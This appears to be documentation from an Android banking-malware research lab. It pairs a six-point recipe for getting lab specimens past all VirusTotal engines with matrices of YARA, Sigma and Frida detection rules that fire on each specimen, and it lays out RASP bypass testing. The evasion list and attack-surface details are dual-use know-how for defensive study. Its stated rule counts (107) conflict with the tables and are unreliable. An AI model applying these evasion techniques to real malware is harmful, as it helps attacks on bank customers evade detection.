All 4 specimens achieved 0/66 VirusTotal. The decisive evasion was not code-level — it was build-pipeline:

1. **No third-party HTTP library** — `HttpURLConnection` over OkHttp
2. **No custom obfuscation dictionary** — default R8 sequential renaming
3. **Standard R8 config** — `proguard-android.txt` without aggressive flags
4. **String externalization** — sensitive constants in `strings.xml`/resources.arsc
5. **High camouflage ratio** — 10:1+ legitimate-to-offensive file ratio
6. **intArrayOf encoding** — char codes + arithmetic shift, indistinguishable from app data

Full methodology: [`VT-EVASION-RESEARCH.md`](VT-EVASION-RESEARCH.md)

---

## Detection Rule Firing Matrix

Which of the 107 detection rules (40 YARA + 51 Sigma + 16 Frida) fire on each specimen. Validates that every specimen trips multiple detection layers.

### YARA Rules (24 total)

Rule names map 1:1 to BLUETEAM-DETECTION.md §"Master Rule Index — YARA Rules (24)".

| # | Rule | SMS-Stealer | Dropper | Overlay-Banker | SkyWeather |
|---|---|---|---|---|---|
| 1 | SMS ContentResolver Pattern | **✓** | -- | **✓** | **✓** |
| 2 | SMS ContentResolver NoModule | **✓** | -- | -- | -- |
| 3 | Dropper Config-Download | -- | **✓** | -- | -- |
| 4 | Overlay Banker Shape | -- | -- | **✓** | -- |
| 5 | DGA MD5+Calendar | -- | -- | -- | **✓** |
| 6 | Resource-Externalized SMS | **✓** | **✓** | -- | -- |
| 7 | DCL AntiForensics | -- | -- | -- | **✓** |
| 7b | intArrayOf Encoding | -- | -- | -- | **✓** |
| 8 | A11y Overlay 2032 | -- | -- | **✓** | **✓** |
| 9 | HiddenVnc MediaProjection | -- | -- | -- | **✓** |
| 10 | NfcRelay GhostTap | -- | -- | -- | **✓** |
| 11 | ResidentialProxy SOCKS5 | -- | -- | -- | **✓** |
| 12 | SsoHijacker MFA AutoApprove | -- | -- | -- | **✓** |
| 13 | YamuxProxy Multiplexer | -- | -- | -- | **✓** |
| 14 | EarlyInitProvider NoOp | -- | -- | **✓** | **✓** |
| 15 | SmsWorm Spreading | -- | -- | -- | **✓** |
| 16 | ScreenReader ATS TreeTraversal | -- | -- | -- | **✓** |
| 17 | Dropper ResourceConfig | -- | **✓** | -- | -- |
| 18 | BehaviorMimicry Jitter | -- | -- | -- | **✓** |
| 19 | TeeOffload KeyStore | -- | -- | -- | **✓** |
| 20 | CertPinnerProbe TLS | -- | -- | -- | **✓** |
| 21 | RestrictedSettingsBypass | -- | -- | -- | **✓** |
| 22 | AntiDebug TripleLayer | -- | -- | -- | **✓** |
| 23 | AntiEmulator BuildProp | -- | -- | -- | **✓** |
| 24 | AntiFrida FiveVector | -- | -- | -- | **✓** |
| | **Total** | **3** | **3** | **4** | **20** |

### Sigma Rules (34 total)

Rule names map 1:1 to BLUETEAM-DETECTION.md §"Master Rule Index — Sigma Rules (34)".

| # | Rule | SMS-Stealer | Dropper | Overlay-Banker | SkyWeather |
|---|---|---|---|---|---|
| 1 | SMS ContentResolver + HTTP POST | **✓** | -- | **✓** | **✓** |
| 2 | FG Config + Download | -- | **✓** | -- | **✓** |
| 3 | A11y Overlay Trigger | -- | -- | **✓** | **✓** |
| 4 | DCL Load + Delete | -- | -- | -- | **✓** |
| 5 | WorkManager Beacon | -- | -- | -- | **✓** |
| 6 | Dual OTP (NLS+SMS) | -- | -- | **✓** | **✓** |
| 7 | ATS Kill Chain Gesture | -- | -- | **✓** | **✓** |
| 8 | A11y Foreground→Overlay Pipeline | -- | -- | **✓** | **✓** |
| 9 | MultiAxis Sensor Flat Data | -- | -- | -- | **✓** |
| 10 | A11yOverlay2032 Creation Timing | -- | -- | -- | **✓** |
| 11 | HiddenVnc Frame Capture | -- | -- | -- | **✓** |
| 12 | NfcRelay APDU-to-Network | -- | -- | -- | **✓** |
| 13 | ResidentialProxy SOCKS5 Listener | -- | -- | -- | **✓** |
| 14 | SsoHijacker Auto-Approve | -- | -- | -- | **✓** |
| 15 | TeeOffload Key-Encrypt-Network | -- | -- | -- | **✓** |
| 16 | PerBuildObfuscation Seed | -- | -- | -- | **✓** |
| 17 | PlayIntegrityProbe Recon | -- | -- | -- | **✓** |
| 18 | MediaProjection AutoConsent | -- | -- | -- | **✓** |
| 19 | NoteApp BIP39 Scraper | -- | -- | -- | **✓** |
| 20 | EarlyInitProvider Pre-App Init | -- | -- | **✓** | **✓** |
| 21 | StealthFgService Low-Visibility | -- | -- | -- | **✓** |
| 22 | BootReceiver Persistence Chain | **✓** | -- | **✓** | **✓** |
| 23 | ContactHarvester Bulk Query | -- | -- | -- | **✓** |
| 24 | ScreenReader Full-Tree Traversal | -- | -- | -- | **✓** |
| 25 | Dropper Two-Stage Check-Download | -- | **✓** | -- | -- |
| 26 | Resource ID Lookup for Network Config | -- | **✓** | -- | -- |
| 27 | CertPinnerProbe TLS Handshake | -- | -- | -- | **✓** |
| 28 | RestrictedSettingsBypass A11y Click | -- | -- | -- | **✓** |
| 29 | SharkBot DGA Weekly Resolution | -- | -- | -- | **✓** |
| 30 | Clipper A11y Clipboard Polling | -- | -- | **✓** | **✓** |
| 31 | Reflection Chain Sensitive API | -- | -- | **✓** | **✓** |
| 32 | OkHttp C2 Exfiltration POST | -- | -- | **✓** | -- |
| 33 | Pinning Bypass TrustManager | -- | -- | -- | **✓** |
| 34 | Modular Loader Stage Chain | -- | -- | -- | **✓** |
| | **Total** | **2** | **4** | **10** | **30** |

### Frida Hooks (37 total)

| Hook Category | SMS-Stealer | Dropper | Overlay-Banker | SkyWeather |
|---|---|---|---|---|
| ContentResolver SMS | **✓** | -- | **✓** | **✓** |
| HttpURLConnection POST | **✓** | -- | -- | -- |
| WindowManager Overlay | -- | -- | **✓** | **✓** |
| DexClassLoader Capture | -- | -- | **✓** | **✓** |
| NLS OTP Monitor | -- | -- | **✓** | **✓** |
| DGA MessageDigest | -- | -- | **✓** | **✓** |
| OkHttp Exfil | -- | -- | **✓** | -- |
| BankerA11y Event Dispatch | -- | -- | **✓** | **✓** |
| dispatchGesture ATS | -- | -- | -- | **✓** |
| Clipboard Polling | -- | -- | **✓** | -- |
| AntiDebug 3-Layer | -- | -- | **✓** | **✓** |
| AntiEmulator 14-Check | -- | -- | **✓** | **✓** |
| AntiFrida 5-Vector | -- | -- | **✓** | **✓** |
| EnvironmentGate Aggregate | -- | -- | **✓** | -- |
| NativeProtect JNI | -- | -- | **✓** | -- |
| ReflectionHider | -- | -- | **✓** | -- |
| StringDecoder XOR+AES | -- | -- | **✓** | -- |
| A11yOverlay2032 Intercept | -- | -- | **✓** | -- |
| HiddenVnc Frame Rate | -- | -- | **✓** | -- |
| NfcRelay APDU Monitor | -- | -- | **✓** | -- |
| ResidentialProxy Session | -- | -- | **✓** | -- |
| BehaviorMimicry Timing | -- | -- | **✓** | **✓** |
| SsoHijacker Intercept | -- | -- | **✓** | -- |
| TeeOffload Key Monitor | -- | -- | **✓** | -- |
| YamuxProxy Stream | -- | -- | **✓** | -- |
| PerBuildObfuscation Seed | -- | -- | **✓** | -- |
| EarlyInitProvider Order | -- | -- | **✓** | -- |
| ContactHarvester | -- | -- | **✓** | -- |
| SmsWorm Rate Monitor | -- | -- | **✓** | -- |
| AccessibilityEngine Gate | -- | -- | -- | **✓** |
| CredentialStore Buffer | -- | -- | -- | **✓** |
| NotificationEngine 5-Point | -- | -- | **✓** | **✓** |
| SmsInterceptor Priority | -- | -- | **✓** | **✓** |
| OtpExtractor Confidence | -- | -- | **✓** | **✓** |
| ScreenReader A11y Tree | -- | -- | -- | **✓** |
| UpdateChannel Config | -- | -- | -- | **✓** |
| CacheUpdateService Delivery | -- | **✓** | -- | -- |
| **Total** | **2** | **1** | **8** | **28** |

### Aggregate

| Specimen | YARA | Sigma | Frida | Total Rules Firing |
|---|---|---|---|---|
| SMS-Stealer | 3 | 2 | 2 | **7** |
| Dropper | 3 | 4 | 1 | **8** |
| Overlay-Banker | 4 | 10 | 8 | **22** |
| SkyWeather (Stage-1) | 20 | 30 | 28 | **78** |

Stage-1-evasion (SkyWeather) fires the most rules — it is the capstone 5-stage specimen containing every stealer surface, every evasion module, every frontier module, and the full kill chain. The dropper fires the fewest because it has the smallest offensive footprint — only delivery logic, no stealer surfaces. Detection coverage scales with attack surface complexity.

---

## RASP Bypass Perspective

From the red team's perspective, RASP (Runtime Application Self-Protection) products protect the **target banking app** (DVBank), not the attacker's banker malware. The banker needs to defeat RASP on the target app to:

1. **Bypass SSL pinning** — capture network traffic between banking app and its server
2. **Bypass root detection** — run on rooted/Frida-attached analyst device
3. **Bypass Frida detection** — attach Frida hooks for dynamic analysis
4. **Bypass integrity checks** — modify APK for instrumentation

### What RASP Does NOT Block

Critical gap from ANALYSIS.md §10:

| Attack Surface | RASP Protection? | Why? |
|---|---|---|
| AccessibilityService reading target app's UI text | **No** | A11y operates at OS level — RASP inside the app cannot prevent another app's A11y from reading its text |
| TYPE_ACCESSIBILITY_OVERLAY drawn over target app | **No** | Overlay is rendered by the banker app, not the target — RASP has no visibility into other processes |
| NotificationListenerService reading target's notifications | **No** | NLS is system-level — target app notifications are readable by any granted NLS |
| SMS BroadcastReceiver intercepting bank-sent OTP | **No** | SMS is intercepted at system level before reaching any app |
| Contact harvesting from the target app's user | **No** | Contact access is phone-wide, not per-app |

**Defender implication:** RASP + MTD (Mobile Threat Defense) are complementary, not interchangeable. RASP hardens the banking app against tampering. MTD detects cross-app attacks (A11y abuse, overlay injection, SMS interception). Without MTD, a bank deploying RASP alone is vulnerable to every stealer surface in this framework's specimens.

### Specimens and RASP Testing Workflow

1. **Wrap DVBank** with RASP vendor tooling (Talsec FreeRASP for Tier-1 testing)
2. **Run Frida bypass scripts** from `scripts/frida/` against wrapped DVBank
3. **Launch each specimen** while Frida-bypassed DVBank is in foreground
4. **Observe** which specimen capabilities RASP detects vs misses
5. **Record** results in RASP bypass matrix (`benchmarks/rasp_bypass_matrix.md`)

See [`RASP-BYPASS-PLAYBOOK.md`](red-team-rasp-bypass-playbook.md) for the full test methodology and responsible-disclosure protocol.

---

## References

- MITRE ATT&CK Mobile: T1407, T1417.002, T1418, T1437, T1517, T1582, T1626
- [`../research/02-anatsa-threat-intel.md`](../research/02-anatsa-threat-intel.md) — Anatsa kill chain
- [`../research/06-sharkbot-threat-intel.md`](../research/06-sharkbot-threat-intel.md) — SharkBot DGA + ATS
- [`../research/08-frontier-2025-2026.md`](../research/08-frontier-2025-2026.md) — Frontier families
- [`../research/10-frontier-2026-q2-q3.md`](../research/10-frontier-2026-q2-q3.md) — Q2-Q3 2026 update
- [`../SAFETY.md`](../SAFETY.md) — Lab safety contract
- [`BLUETEAM-DETECTION.md`](BLUETEAM-DETECTION.md) — Complete detection engineering companion
- [`VT-EVASION-RESEARCH.md`](VT-EVASION-RESEARCH.md) — Full VT evasion methodology
